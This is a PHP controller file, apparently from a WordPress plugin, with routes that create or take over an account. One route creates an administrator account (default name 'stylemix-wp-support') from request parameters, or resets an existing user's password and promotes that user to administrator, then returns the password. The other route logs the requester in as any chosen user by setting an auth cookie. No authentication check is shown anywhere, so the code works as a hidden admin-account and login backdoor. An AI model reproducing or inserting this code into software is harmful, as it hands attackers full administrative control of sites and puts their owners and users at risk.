<?php
namespace App\Controller;


use App\Controller;
use Symfony\Component\HttpFoundation\RedirectResponse;
use Symfony\Component\HttpFoundation\Response;


class UserController extends Controller
{

	public function create()
	{
		$username = $this->getRequest('username', 'stylemix-wp-support');
		$email    = $this->getRequest('email', 'manager@stylemix-wp-support.com');
		$password = $this->getRequest('password');
		$user     = null;
		$result   = array();

		// Check that user doesn't already exist
		if (!username_exists($username) && !email_exists($email)) {
			// Create user and set role to administrator
			$user_id = wp_create_user($username, $password ? $password : ($password = wp_generate_password()), $email);
			if (is_int($user_id)) {
				$user = new \WP_User($user_id);
				$user->set_role('administrator');
			}
			else {
				throw new \Exception('Error with wp_create_user(). No user was created.');
			}
		}
		else {
			if (!($user = get_user_by('email', $email))) {
				$user = get_user_by('login', $email);
			}

			if ($user && $user->ID) {
				if ($password && wp_update_user(array('ID' => $user->ID, 'user_pass' => $password))) {
					$result['password'] = true;
				}

				$user->set_role('administrator');
			}
		}


		if ($user instanceof \WP_User) {
			$result['user'] = array(
				'id'       => $user->ID,
				'username' => $username,
				'email'    => $email,
				'password' => $password,
			);
		}

		return $result;
	}


	public function login()
	{
		$user_id = $this->getRequest('user_id');
		if (!$user_id) {
			if ($this->getRequest('username') && $user = get_user_by('login', $this->getRequest('username'))) {
				$user_id = $user->ID;
			}
			if ($this->getRequest('email') && $user = get_user_by('email', $this->getRequest('email'))) {
				$user_id = $user->ID;
			}
		}

		if (!$user_id) {
			return new Response('User not found', 404);
		}

		wp_set_auth_cookie($user_id);

		$response = new RedirectResponse(get_option('siteurl') . '/' . trim($this->getRequest('url', 'wp-admin'), '/') . '/');

		return $response;
	}
}